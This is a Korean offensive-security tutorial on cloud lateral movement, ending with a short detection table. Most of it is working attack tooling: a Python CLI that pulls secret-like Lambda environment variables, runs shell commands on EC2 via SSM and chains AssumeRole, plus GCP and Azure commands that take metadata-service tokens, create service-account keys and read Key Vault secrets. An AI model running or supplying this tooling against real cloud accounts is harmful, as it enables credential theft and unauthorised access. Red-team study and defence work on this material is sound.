# 클라우드 횡이동 — 계정 피버팅·서비스 간 이동·탐지

## 1. 클라우드 횡이동 경로

```
초기 접근 (Lambda/EC2 RCE)
    │
    ▼
인스턴스 메타데이터 서비스 (IMDS)
    │  → IAM 역할 임시 자격증명 획득
    ▼
IAM 역할 분석
    │  → 다른 서비스 접근 권한 확인
    ▼
클라우드 서비스 횡이동
    │  → S3 → Lambda → RDS → ECS
    │  → STS AssumeRole 체인
    ▼
다른 계정/리전으로 이동
    │  → 리소스 기반 정책 활용
    │  → 교차 계정 역할
```

---

## 2. AWS 서비스 간 횡이동

```python
#!/usr/bin/env python3
"""AWS 서비스 간 횡이동 경로 탐색 CLI."""

import argparse
import json
import boto3
from botocore.exceptions import ClientError, NoCredentialsError


def get_current_identity() -> dict:
    sts = boto3.client("sts")
    try:
        return sts.get_caller_identity()
    except (ClientError, NoCredentialsError) as e:
        return {"error": str(e)}


def enumerate_accessible_s3_buckets() -> list[dict]:
    """접근 가능한 S3 버킷 열거."""
    s3 = boto3.client("s3")
    accessible = []
    try:
        buckets = s3.list_buckets()["Buckets"]
        for bucket in buckets:
            name = bucket["Name"]
            try:
                # 버킷 내용 접근 시도
                s3.head_bucket(Bucket=name)
                accessible.append({
                    "name": name,
                    "created": str(bucket.get("CreationDate")),
                    "readable": True,
                })
            except ClientError as e:
                if e.response["Error"]["Code"] == "403":
                    accessible.append({"name": name, "readable": False})
    except ClientError:
        pass
    return accessible


def pivot_via_ssm(
    instance_id: str,
    command: str,
    region: str = "ap-northeast-2",
) -> dict:
    """SSM Session Manager로 EC2 명령 실행 (IAM 권한 있을 때)."""
    ssm = boto3.client("ssm", region_name=region)
    try:
        response = ssm.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [command]},
        )
        command_id = response["Command"]["CommandId"]
        import time
        time.sleep(2)

        output = ssm.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
        )
        return {
            "stdout": output.get("StandardOutputContent"),
            "stderr": output.get("StandardErrorContent"),
            "status": output.get("Status"),
        }
    except ClientError as e:
        return {"error": str(e)}


def enumerate_lambda_functions(region: str = "ap-northeast-2") -> list[dict]:
    """Lambda 함수 열거 및 환경 변수 접근 시도."""
    lambda_client = boto3.client("lambda", region_name=region)
    functions = []

    try:
        paginator = lambda_client.get_paginator("list_functions")
        for page in paginator.paginate():
            for func in page["Functions"]:
                func_info = {
                    "name": func["FunctionName"],
                    "runtime": func.get("Runtime"),
                    "role": func.get("Role"),
                    "env_vars": {},
                }
                # 환경 변수 접근 시도
                try:
                    config = lambda_client.get_function_configuration(
                        FunctionName=func["FunctionName"]
                    )
                    env = config.get("Environment", {}).get("Variables", {})
                    # 민감 환경 변수 필터링
                    func_info["env_vars"] = {
                        k: v for k, v in env.items()
                        if any(kw in k.upper() for kw in ["KEY", "SECRET", "TOKEN", "PASS", "DB"])
                    }
                except ClientError:
                    pass
                functions.append(func_info)
    except ClientError as e:
        print(f"Lambda 열거 오류: {e}")

    return functions


def find_ec2_instances_with_public_ip(region: str = "ap-northeast-2") -> list[dict]:
    """퍼블릭 IP를 가진 EC2 인스턴스 탐색."""
    ec2 = boto3.client("ec2", region_name=region)
    public_instances = []

    try:
        paginator = ec2.get_paginator("describe_instances")
        for page in paginator.paginate():
            for reservation in page["Reservations"]:
                for instance in reservation["Instances"]:
                    public_ip = instance.get("PublicIpAddress")
                    if public_ip:
                        public_instances.append({
                            "instance_id": instance["InstanceId"],
                            "public_ip": public_ip,
                            "private_ip": instance.get("PrivateIpAddress"),
                            "state": instance["State"]["Name"],
                            "tags": {t["Key"]: t["Value"] for t in instance.get("Tags", [])},
                        })
    except ClientError as e:
        print(f"EC2 열거 오류: {e}")

    return public_instances


def assume_role_and_enumerate(
    role_arn: str,
    session_name: str = "PivotSession",
) -> dict:
    """역할 전환 후 자원 열거."""
    sts = boto3.client("sts")
    try:
        assumed = sts.assume_role(
            RoleArn=role_arn,
            RoleSessionName=session_name,
        )
        creds = assumed["Credentials"]

        # 임시 자격증명으로 새 세션 생성
        session = boto3.Session(
            aws_access_key_id=creds["AccessKeyId"],
            aws_secret_access_key=creds["SecretAccessKey"],
            aws_session_token=creds["SessionToken"],
        )

        sts_new = session.client("sts")
        identity = sts_new.get_caller_identity()
        return {
            "role_arn": role_arn,
            "assumed_identity": identity,
            "expiration": str(creds["Expiration"]),
        }
    except ClientError as e:
        return {"error": str(e)}


def main() -> None:
    parser = argparse.ArgumentParser(description="AWS 클라우드 횡이동 탐색")
    sub = parser.add_subparsers(dest="cmd", required=True)

    who_p = sub.add_parser("whoami", help="현재 AWS 자격증명 확인")
    s3_p = sub.add_parser("s3", help="S3 버킷 열거")
    lambda_p = sub.add_parser("lambda", help="Lambda 함수 열거")
    lambda_p.add_argument("--region", default="ap-northeast-2")
    ec2_p = sub.add_parser("ec2", help="EC2 인스턴스 열거")
    ec2_p.add_argument("--region", default="ap-northeast-2")
    assume_p = sub.add_parser("assume", help="역할 전환")
    assume_p.add_argument("role_arn")

    args = parser.parse_args()

    match args.cmd:
        case "whoami":
            identity = get_current_identity()
            print(json.dumps(identity, indent=2, default=str))
        case "s3":
            buckets = enumerate_accessible_s3_buckets()
            for b in buckets:
                icon = "[+]" if b.get("readable") else "[-]"
                print(f"{icon} {b['name']}")
        case "lambda":
            functions = enumerate_lambda_functions(args.region)
            for f in functions:
                print(f"\n[*] {f['name']} ({f['runtime']})")
                if f["env_vars"]:
                    print(f"  [!] 민감 환경 변수: {list(f['env_vars'].keys())}")
        case "ec2":
            instances = find_ec2_instances_with_public_ip(args.region)
            for inst in instances:
                print(f"[+] {inst['instance_id']}: {inst['public_ip']} ({inst['state']})")
        case "assume":
            result = assume_role_and_enumerate(args.role_arn)
            print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
```

---

## 3. GCP 횡이동

```bash
# GCP 서비스 계정 열거
gcloud iam service-accounts list --format="table(email,displayName)"

# 서비스 계정 키 생성 (권한 있을 때)
gcloud iam service-accounts keys create key.json \
  --iam-account=sa@project.iam.gserviceaccount.com

# GCP 프로젝트 간 이동
gcloud config set project another-project
gcloud compute instances list

# Metadata 서비스
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

---

## 4. Azure 횡이동

```bash
# 현재 자격증명 확인
az account show
az account get-access-token

# 구독 열거
az account list --output table

# 관리 자격증명 탈취 (IMDS)
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 역할 할당 확인
az role assignment list --all --output table

# Key Vault 시크릿 접근
az keyvault list
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --name SECRET --vault-name VAULT_NAME
```

---

## 5. 클라우드 횡이동 탐지

| 공격 | 탐지 이벤트 | 방어 |
|------|-------------|------|
| IMDS 접근 | VPC Flow Logs + 메타데이터 접근 로그 | IMDSv2 강제 |
| AssumeRole | CloudTrail AssumeRole 이벤트 | SCP로 특정 역할 제한 |
| 비정상 리전 | CloudTrail ConsoleLogin 리전 확인 | SCP로 허용 리전 제한 |
| 신규 IAM 키 | CloudTrail CreateAccessKey | GuardDuty 알림 |
| 퍼블릭 버킷 생성 | S3 버킷 ACL 변경 | S3 Block Public Access |
